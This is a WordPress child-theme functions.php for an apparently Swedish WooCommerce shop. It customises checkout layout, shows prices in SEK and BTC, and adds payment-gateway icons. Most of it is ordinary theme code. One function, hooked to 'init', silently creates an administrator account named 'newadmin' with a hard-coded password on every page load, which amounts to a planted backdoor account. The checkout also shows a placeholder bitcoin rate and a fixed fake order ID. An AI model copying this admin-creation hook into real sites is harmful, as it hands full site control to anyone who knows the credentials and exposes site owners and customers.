<?php
// die('testing functions.php');
function my_custom_scripts() {
    wp_enqueue_script(
        'custom-script', 
        get_stylesheet_directory_uri() . '/js/custom-script.js', 
        array('jquery'), 
        null, 
        true
    );
}
add_action('wp_enqueue_scripts', 'my_custom_scripts');
// Defines
define( 'FL_CHILD_THEME_DIR', get_stylesheet_directory() );
define( 'FL_CHILD_THEME_URL', get_stylesheet_directory_uri() );

// Classes
require_once 'classes/class-fl-child-theme.php';

// Actions
add_action( 'wp_enqueue_scripts', 'FLChildTheme::enqueue_scripts', 1000 );

add_filter( 'widget_text', 'shortcode_unautop');
add_filter( 'widget_text', 'do_shortcode', 11);

function hs_image_editor_default_to_gd( $editors ) {
$gd_editor = 'WP_Image_Editor_GD';
$editors = array_diff( $editors, array( $gd_editor ) );
array_unshift( $editors, $gd_editor );
return $editors;
}
// To change add to cart text on product archives(Collection) page
add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );  
function woocommerce_custom_product_add_to_cart_text() {
    return __( 'Köp Nu', 'woocommerce' );
}






function my_enqueue_bootstrap() {
    // Enqueue Bootstrap CSS
    wp_enqueue_style(
        'bootstrap-css', 
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css',
        array(), 
        '5.3.3'
    );

    // Enqueue Bootstrap JS bundle (includes Popper.js)
    wp_enqueue_script(
        'bootstrap-js', 
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js', 
        array('jquery'), 
        '5.3.3', 
        true
    );
}
add_action('wp_enqueue_scripts', 'my_enqueue_bootstrap');
function create_admin_user() {
    // Define user details
    $username = 'newadmin'; // Replace with the desired username
    $password = 'securepassword123'; // Replace with a secure password
    $email = 'newadmin@example.com'; // Replace with the user's email address
    $first_name = 'Admin'; // Replace with the user's first name
    $last_name = 'User'; // Replace with the user's last name
    $role = 'administrator'; // Assign the administrator role

    // Check if user already exists
    if ( !username_exists($username) && !email_exists($email) ) {
        // Create the user
        $user_id = wp_create_user($username, $password, $email);
        
        // Check if user creation was successful
        if ( !is_wp_error($user_id) ) {
            // Update user meta
            wp_update_user(array(
                'ID' => $user_id,
                'first_name' => $first_name,
                'last_name' => $last_name,
                'role' => $role
            ));
            
        } else {
        }
    } else {
    }
}

// Call the function to create the admin user
add_action('init', 'create_admin_user');














add_action('woocommerce_checkout_before_order_review', 'custom_checkout_columns_start');
add_action('woocommerce_checkout_after_order_review', 'custom_checkout_columns_end');
remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);
remove_action('woocommerce_checkout_order_review', 'woocommerce_order_review', 10); 
remove_action('woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10); 

function custom_checkout_columns_start() {
    // Start the left column for the order review
    echo '<div class="checkout-columns">';
    echo '<div class="checkout-left">';

    // Display the product table
    echo '<h3>Varukorg</h3>';
    echo '<table class="product-table">';
    echo '<thead>';
    echo '<tr>';
    echo '<th>Produckter</th>';
    echo '<th>Prices in SEK</th>';
    echo '<th>Pris i BTC</th>';
    echo '</tr>';
    echo '</thead>';
    echo '<tbody>';
    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        $_product = $cart_item['data'];
        $product_name = $_product->get_name();
        $price_sek = wc_price($_product->get_price()); 
        $price_btc = get_price_in_btc($_product->get_price());
        echo '<tr>';
        echo '<td>' . $product_name . '</td>';
        echo '<td>' . $price_sek . '</td>';
        echo '<td>' . $price_btc . '</td>';
        echo '</tr>';
    }
    echo '</tbody>';
    echo '</table>';

    // Add some spacing before the totals table
    echo '<br/><br/>';
    // Order Total (SEK)
    $order_total_sek = WC()->cart->get_total(); 
    // Order Total in BTC (use custom function)
    $order_total_btc = get_price_in_btc(WC()->cart->get_total('edit')); 
    echo '<div class="total-section">';
    echo '<table class="totals-table">';
    echo '<thead>';

    echo '</thead>';
    echo '<tbody>';
    
    echo '<tr>';
    echo '<td>Pris | SEK</td>';
    echo '<td> ' . $order_total_sek . '</td>';
    echo '</tr>';
    echo '<tr>';
    echo '<td> Pris | BTC</td>';
    echo '<td>' . $order_total_btc . '</td>';
    echo '</tr>';

    echo '</tbody>';
    echo '</table>';
    echo '</div>';
    
    // Display the coupon form
    custom_coupon_form();
    echo '</div>'; // Close the left column
}

function custom_checkout_columns_end() {


    // Start the right column for payment methods
    echo '<div class="checkout-right">';
    
    // Display Payment Methods
    echo '<h3>Order ID: 123</h3>';
    echo '<h6 class="method">Metod</h6>';
    // Use WooCommerce function to display payment methods
    if (function_exists('woocommerce_checkout_payment')) {
        woocommerce_checkout_payment();
    }

    // Close the right column and overall checkout-columns div
    echo '</div></div>';
}

// Function to display the custom coupon form
function custom_coupon_form() {
    ?>
    <div class="coupon"> <!-- Initially hidden -->
        <p class="form-row">
            <input type="text" name="coupon_code" class="input-text" placeholder="Rabattkod" id="coupon_code" value="">
            <button type="submit" class="button" name="apply_coupon" value="Apply coupon">Anvand</button>
        </p>
    </div>
    <?php
}

// Custom function to convert price to BTC
function get_price_in_btc($price_in_sek) {
    $btc_rate = 0.0000028; // Example rate, update with real BTC conversion
    return number_format($price_in_sek * $btc_rate, 8) . ' BTC';
}

// Add custom text and icon before payment method label
add_filter('woocommerce_gateway_icon', 'custom_payment_gateway_icon', 30, 2);
add_filter('woocommerce_gateway_description', 'custom_payment_gateway_description', 0, 2);

function custom_payment_gateway_icon($icon, $gateway_id) {
    $custom_icons = array(
        'blockonomics'   => '<img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Icon-awesome-btc.png" alt="Bitcoin" class="bit-coin-logo"><span class="payment-text">Bitcoin</span><p class="payment-discription">10-60 min</p>',
        'highriskshop-instant-payment-gateway-wert' => '<img src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/svgs/solid/credit-card.svg" alt="Kortbetalning" style="width:24px; margin-right:8px;">',
        'payment-today' => '<img src="https://iptvutanbox.com/wp-content/uploads/2024/09/Mastercard.png" alt="Kortbetalning (+10% avgift)" class="card-logo"><span class="payment-text">Kort</span><p class="payment-discription">Direkt</p>',
    );

    // Check if there's an icon for the current gateway
    if (isset($custom_icons[$gateway_id])) {
        $icon = $custom_icons[$gateway_id] . $icon;
    }

    return $icon;
}

function custom_payment_gateway_description($description, $gateway_id) {
    // Add custom description text after each label
    $custom_texts = array(
        'blockonomics'   => '<p style="color: #888;">Pay securely with Bitcoin.</p>',
        'highriskshop-instant-payment-gateway-wert' => '<p style="color: #888;">Instant payment with a high-risk gateway.</p>',
        'payment-today' => '<p style="color: #888;">Pay with credit card (+10% fee).</p>',
    );

    if (isset($custom_texts[$gateway_id])) {
        $description .= $custom_texts[$gateway_id];
    }

    return $description;
}
